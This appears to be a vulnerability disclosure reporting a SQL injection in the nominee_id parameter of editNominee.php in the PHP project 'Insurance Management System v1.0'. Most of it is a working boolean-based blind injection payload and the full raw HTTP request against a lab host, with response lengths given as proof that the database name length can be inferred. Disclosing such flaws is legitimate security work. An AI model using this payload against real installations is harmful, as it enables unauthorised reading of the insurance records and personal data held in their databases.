# Insurance Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

vendors: https://itsourcecode.com/free-projects/php-project/insurance-management-system-project-in-php-free-download/

Vulnerability File: /insurance/editNominee.php?nominee_id=

Vulnerability location: /insurance/editNominee.php?nominee_id=,nominee_id=

[+] Payload: /insurance/editNominee.php?nominee_id=1511989270-522970848%27%20and%20length(database())%20=4%20--+ // Leak place ---> nominee_id=

Current database name: lims,length is 4

```sql
GET /insurance/editNominee.php?nominee_id=1511989270-522970848%27%20and%20length(database())%20=4%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=tmbv0mt5ff9hphhe0mtv4sghfq
Connection: close
```

When length (database ()) = 3, Content-Length: 4297

![image](https://user-images.githubusercontent.com/54017627/166145608-a4a96fa9-2dac-4f11-9553-db7b2e0cdb8b.png)

![image](https://user-images.githubusercontent.com/54017627/166145645-d65ea022-f297-4ebb-9743-5ff4af9d15e0.png)

When length (database ()) = 4, Content-Length: 5523

![image](https://user-images.githubusercontent.com/54017627/166145599-af8f06fd-ee6a-47e7-a041-0c66c6a42fee.png)

![image](https://user-images.githubusercontent.com/54017627/166145624-cb5d3dce-affd-4f55-b06b-444c9c0757aa.png)
